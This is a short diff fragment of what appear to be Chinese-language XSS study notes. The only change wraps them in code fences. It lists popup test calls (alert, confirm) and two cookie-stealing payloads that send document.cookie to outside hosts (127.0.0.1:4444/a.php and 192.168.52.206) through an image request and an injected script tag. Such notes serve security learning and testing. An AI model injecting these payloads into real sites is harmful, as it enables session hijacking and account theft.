@@ -1,3 +1,4 @@
+```
 xss三种弹窗方式
 alert('xss') // 直接执行
 confirm('xss') // 需要点击
@@ -55,3 +56,4 @@ img.src="http://127.0.0.1:4444/a.php?cookie="+document.cookie;
 
 
 <script>new Image().src="http://192.168.52.206/?co="+document.cookie;</script>
+```
